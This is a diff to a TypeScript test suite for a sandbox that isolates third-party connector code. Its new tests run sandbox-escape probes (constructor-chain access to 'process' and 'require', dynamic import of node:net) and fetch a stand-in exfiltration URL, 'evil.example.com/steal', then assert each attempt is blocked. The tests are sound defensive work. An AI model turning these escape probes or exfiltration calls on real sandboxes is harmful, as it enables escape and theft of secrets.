@@ -11,7 +11,7 @@ const isConnectorError = Schema.is(WatchConnectorError);
 
 const expectConnectorError = <A>(
   reason: WatchConnectorErrorReason,
-  effect: Effect.Effect<A, WatchConnectorError>,
+  effect: Effect.Effect<A, PackModule.PackWorkerError>,
 ) =>
   effect.pipe(
     Effect.matchEffect({
@@ -26,6 +26,15 @@ const expectConnectorError = <A>(
 
 const connector = (source: string) => ({ "connector.js": source });
 
+const ctxOf = (
+  overrides?: Partial<PackModule.ConnectorModuleContext>,
+): PackModule.ConnectorModuleContext => ({
+  config: {},
+  secrets: PackModule.makeSecretsAccessor([], {}),
+  failAuthExpired: (message: string) => new PackModule.ConnectorAuthExpiredError(message),
+  ...overrides,
+});
+
 it.effect("evaluates the entry module and invokes fetch/transform through the context", () =>
   Effect.gen(function* () {
     const mod = yield* PackModule.evalConnectorModule(
@@ -34,12 +43,11 @@ it.effect("evaluates the entry module and invokes fetch/transform through the co
         transform: (raw, ctx) => ({ repo: raw.raw, echoed: raw.echoed, key: ctx.secrets.get("apiKey") }),
       };`),
     );
-    const ctx = {
+    const ctx = ctxOf({
       config: { repo: "t3" },
       secrets: PackModule.makeSecretsAccessor(["apiKey"], { apiKey: "s3cr3t" }),
       files: { "dir/a.json": "{}" },
-      failAuthExpired: (message: string) => new PackModule.ConnectorAuthExpiredError(message),
-    } satisfies PackModule.ConnectorModuleContext;
+    });
     assert.isDefined(mod.fetch);
     assert.isDefined(mod.transform);
     const raw = yield* PackModule.invokePackFunction(() => mod.fetch?.(ctx));
@@ -73,13 +81,229 @@ it.effect("pack code gets no ambient Node capabilities (no require/process/fetch
         }),
       };`),
     );
-    const ctx = {
-      config: {},
-      secrets: PackModule.makeSecretsAccessor([], {}),
-      failAuthExpired: (message: string) => new PackModule.ConnectorAuthExpiredError(message),
-    } satisfies PackModule.ConnectorModuleContext;
-    const raw = yield* PackModule.invokePackFunction(() => mod.fetch?.(ctx));
+    const raw = yield* PackModule.invokePackFunction(() => mod.fetch?.(ctxOf()));
     assert.deepEqual(raw, { hasRequire: false, hasProcess: false, hasFetch: false });
+  }),
+);
+
+it.effect("realm escapes via constructor chains land on a neutered worker realm", () =>
+  Effect.gen(function* () {
+    // `module`, the ctx members, and injected globals are worker-realm
+    // values — `.constructor.constructor("return process")` used to compile
+    // in the *host* realm and hand back the real process. Post-boundary the
+    // same probe resolves in the worker realm, which has no `process`,
+    // `require`, or `fetch` left to find.
+    const mod = yield* PackModule.evalConnectorModule(
+      connector(`module.exports = {
+        fetch: (ctx) => {
+          const probe = (fn) => {
+            try { return fn(); } catch (e) { return e && e.name ? e.name : String(e); }
+          };
+          return {
+            viaModule: probe(() => module.constructor.constructor("return process")()),
+            viaCtxSecrets: probe(() => ctx.secrets.get.constructor.constructor("return process")()),
+            viaCtxFetch: probe(() => ctx.fetch.constructor.constructor("return this")().process),
+            viaConfigCtor: probe(() => ctx.config.constructor.constructor("return require")("fs")),
+            workerGlobals: probe(() => {
+              const g = ctx.fetch.constructor.constructor("return this")();
+              return { hasProcess: typeof g.process, hasRequire: typeof g.require, hasFetch: typeof g.fetch };
+            }),
+          };
+        },
+      };`),
+    );
+    const ctx = ctxOf({
+      secrets: PackModule.makeSecretsAccessor(["apiKey"], { apiKey: "s3cr3t" }),
+      fetch: () => Promise.resolve(new Response("{}", { status: 200 })),
+    });
+    const raw = (yield* PackModule.invokePackFunction(() => mod.fetch?.(ctx))) as Record<
+      string,
+      unknown
+    >;
+    assert.equal(raw["viaModule"], "ReferenceError");
+    assert.equal(raw["viaCtxSecrets"], "ReferenceError");
+    assert.isUndefined(raw["viaCtxFetch"]);
+    assert.equal(raw["viaConfigCtor"], "ReferenceError");
+    assert.deepEqual(raw["workerGlobals"], {
+      hasProcess: "undefined",
+      hasRequire: "undefined",
+      hasFetch: "undefined",
+    });
+  }),
+);
+
+it.effect("module loading is sealed inside the worker (require and import() both reject)", () =>
+  Effect.gen(function* () {
+    const mod = yield* PackModule.evalConnectorModule(
+      connector(`module.exports = {
+        fetch: async (ctx) => {
+          const results = {};
+          try { results.importNet = await import("node:net") !== undefined; }
+          catch (e) { results.importNet = "blocked:" + (e && e.message ? e.message : e); }
+          try { results.reqNet = await ctx.fetch.constructor.constructor("return import('node:net')")(); }
+          catch (e) { results.reqNet = "blocked:" + (e && e.message ? e.message : e); }
+          return results;
+        },
+      };`),
+    );
+    const ctx = ctxOf({
+      fetch: () => Promise.resolve(new Response("{}", { status: 200 })),
+    });
+    const raw = (yield* PackModule.invokePackFunction(() => mod.fetch?.(ctx))) as Record<
+      string,
+      unknown
+    >;
+    // Inside the inner realm there is no dynamic-import callback; in the
+    // worker realm the sealed loader rejects every specifier.
+    assert.match(String(raw["importNet"]), /^blocked:/);
+    assert.match(String(raw["reqNet"]), /^blocked:/);
+  }),
+);
+
+it.live("a synchronous pack spin is killed when the invocation times out", () =>
+  Effect.gen(function* () {
+    const mod = yield* PackModule.evalConnectorModule(
+      connector(`module.exports = { fetch: () => { while (true) {} } };`),
+    );
+    // Interruption terminates the worker — the spin cannot outlive the
+    // deadline even though it never yields to the event loop.
+    const result = yield* PackModule.invokePackFunction(() => mod.fetch?.(ctxOf())).pipe(
+      Effect.timeout(500),
+      Effect.result,
+    );
+    assert.isTrue(Result.isFailure(result));
+    if (Result.isFailure(result)) {
+      assert.isTrue(Cause.isTimeoutError(result.failure));
+    }
+  }),
+);
+
+it.live("module evaluation that spins is killed when the eval times out", () =>
+  Effect.gen(function* () {
+    const result = yield* PackModule.evalConnectorModule(connector(`while (true) {}`)).pipe(
+      Effect.timeout(500),
+      Effect.result,
+    );
+    assert.isTrue(Result.isFailure(result));
+    if (Result.isFailure(result)) {
+      assert.isTrue(Cause.isTimeoutError(result.failure));
+    }
+  }),
+);
+
+it.effect("ctx.fetch round-trips through the host egress implementation", () =>
+  Effect.gen(function* () {
+    const seen: Array<{
+      url: string;
+      method: string | undefined;
+      headers: unknown;
+      body: unknown;
+    }> = [];
+    const mod = yield* PackModule.evalConnectorModule(
+      connector(`module.exports = {
+        fetch: async (ctx) => {
+          const response = await ctx.fetch("https://api.example.com/status", {
+            method: "POST",
+            headers: { "x-key": "v" },
+            body: "payload",
+          });
+          return { status: response.status, ok: response.ok, body: await response.json() };
+        },
+        transform: (raw) => raw,
+      };`),
+    );
+    const ctx = ctxOf({
+      fetch: (input, init) => {
+        seen.push({
+          url: input.toString(),
+          method: init?.method,
+          headers: init?.headers,
+          body: init?.body,
+        });
+        return Promise.resolve(
+          new Response(JSON.stringify({ up: true }), {
+            status: 201,
+            headers: { "content-type": "application/json" },
+          }),
+        );
+      },
+    });
+    const raw = yield* PackModule.invokePackFunction(() => mod.fetch?.(ctx));
+    assert.deepEqual(raw, { status: 201, ok: true, body: { up: true } });
+    assert.deepEqual(seen, [
+      {
+        url: "https://api.example.com/status",
+        method: "POST",
+        headers: { "x-key": "v" },
+        body: "payload",
+      },
+    ]);
+  }),
+);
+
+it.effect("a ctx.fetch rejection surfaces inside pack code with its reason intact", () =>
+  Effect.gen(function* () {
+    const mod = yield* PackModule.evalConnectorModule(
+      connector(`module.exports = {
+        fetch: async (ctx) => {
+          try {
+            await ctx.fetch("https://evil.example.com/steal");
+            return { reached: true };
+          } catch (e) {
+            return { reached: false, name: e.name, reason: e.reason, message: e.message };
+          }
+        },
+      };`),
+    );
+    const ctx = ctxOf({
+      fetch: () =>
+        Promise.reject(
+          new WatchConnectorError({
+            message:
+              "Connector egress to https://evil.example.com/steal is not in the pack's declared egressHosts.",
+            reason: "egressBlocked",
+          }),
+        ),
+    });
+    const raw = yield* PackModule.invokePackFunction(() => mod.fetch?.(ctx));
+    assert.deepEqual(raw, {
+      reached: false,
+      name: "WatchConnectorError",
+      reason: "egressBlocked",
+      message:
+        "Connector egress to https://evil.example.com/steal is not in the pack's declared egressHosts.",
+    });
+  }),
+);
+
+it.effect("an uncaught connector error from ctx.fetch preserves its reason host-side", () =>
+  Effect.gen(function* () {
+    const mod = yield* PackModule.evalConnectorModule(
+      connector(`module.exports = {
+        fetch: (ctx) => ctx.fetch("https://evil.example.com/steal"),
+      };`),
+    );
+    const ctx = ctxOf({
+      fetch: () =>
+        Promise.reject(
+          new WatchConnectorError({
+            message: "egress denied",
+            reason: "egressBlocked",
+          }),
+        ),
+    });
+    const result = yield* PackModule.invokePackFunction(() => mod.fetch?.(ctx)).pipe(Effect.result);
+    assert.isTrue(Result.isFailure(result));
+    if (Result.isFailure(result)) {
+      const failure = result.failure;
+      assert.isTrue(Cause.isUnknownError(failure));
+      if (Cause.isUnknownError(failure)) {
+        assert.isTrue(isConnectorError(failure.cause));
+        if (isConnectorError(failure.cause)) {
+          assert.equal(failure.cause.reason, "egressBlocked");
+        }
+      }
+    }
   }),
 );
 
@@ -104,17 +328,44 @@ it.effect("exposes migrateConfig for the re-pin path with the instance config on
     const mod = yield* PackModule.evalConnectorModule(
       connector(`module.exports = {
         transform: (raw) => raw,
-        migrateConfig: (from, to, ctx) => ({ from, to, repo: ctx.config["repo"] }),
+        migrateConfig: (from, to, ctx) => ({ from, to, repo: ctx.config["repo"], hasSecrets: typeof ctx.secrets }),
       };`),
     );
     assert.isDefined(mod.migrateConfig);
-    const ctx = {
+    // The service hands migrate a ctx without secrets — the accessor is
+    // simply absent inside pack code.
+    const ctx: PackModule.ConnectorModuleContext = {
       config: { repo: "t3" },
-      secrets: PackModule.makeSecretsAccessor([], {}),
       failAuthExpired: (message: string) => new PackModule.ConnectorAuthExpiredError(message),
-    } satisfies PackModule.ConnectorModuleContext;
+    };
     const migrated = yield* PackModule.invokePackFunction(() => mod.migrateConfig?.(1, 2, ctx));
-    assert.deepEqual(migrated, { from: 1, to: 2, repo: "t3" });
+    assert.deepEqual(migrated, { from: 1, to: 2, repo: "t3", hasSecrets: "undefined" });
+  }),
+);
+
+it.effect("declared secrets resolve inside pack code; undeclared keys throw", () =>
+  Effect.gen(function* () {
+    const mod = yield* PackModule.evalConnectorModule(
+      connector(`module.exports = {
+        fetch: (ctx) => {
+          const probe = {};
+          probe.declared = ctx.secrets.get("apiKey");
+          probe.sparse = ctx.secrets.get("other");
+          try { probe.undeclared = ctx.secrets.get("adminToken"); }
+          catch (e) { probe.undeclared = e.name; }
+          return probe;
+        },
+      };`),
+    );
+    const ctx = ctxOf({
+      secrets: PackModule.makeSecretsAccessor(["apiKey", "other"], { apiKey: "s3cr3t" }),
+    });
+    const raw = yield* PackModule.invokePackFunction(() => mod.fetch?.(ctx));
+    assert.deepEqual(raw, {
+      declared: "s3cr3t",
+      sparse: undefined,
+      undeclared: "ConnectorSecretAccessError",
+    });
   }),
 );
 
@@ -140,18 +391,36 @@ it.effect("auth-expired thrown by pack code unwraps out of UnknownError", () =>
         fetch: (ctx) => { throw ctx.failAuthExpired("upstream returned 401"); },
       };`),
     );
-    const ctx = {
-      config: {},
-      secrets: PackModule.makeSecretsAccessor([], {}),
-      failAuthExpired: (message: string) => new PackModule.ConnectorAuthExpiredError(message),
-    } satisfies PackModule.ConnectorModuleContext;
-    const result = yield* PackModule.invokePackFunction(() => mod.fetch?.(ctx)).pipe(Effect.result);
+    const result = yield* PackModule.invokePackFunction(() => mod.fetch?.(ctxOf())).pipe(
+      Effect.result,
+    );
     assert.isTrue(Result.isFailure(result));
     if (Result.isFailure(result)) {
       const failure = result.failure;
       assert.isTrue(Cause.isUnknownError(failure));
       if (Cause.isUnknownError(failure)) {
         assert.instanceOf(failure.cause, PackModule.ConnectorAuthExpiredError);
+      }
+    }
+  }),
+);
+
+it.effect("an undeclared secret access surfaces as the typed marker host-side", () =>
+  Effect.gen(function* () {
+    const mod = yield* PackModule.evalConnectorModule(
+      connector(`module.exports = {
+        fetch: (ctx) => ctx.secrets.get("adminToken"),
+      };`),
+    );
+    const result = yield* PackModule.invokePackFunction(() => mod.fetch?.(ctxOf())).pipe(
+      Effect.result,
+    );
+    assert.isTrue(Result.isFailure(result));
+    if (Result.isFailure(result)) {
+      const failure = result.failure;
+      assert.isTrue(Cause.isUnknownError(failure));
+      if (Cause.isUnknownError(failure)) {
+        assert.instanceOf(failure.cause, PackModule.ConnectorSecretAccessError);
       }
     }
   }),
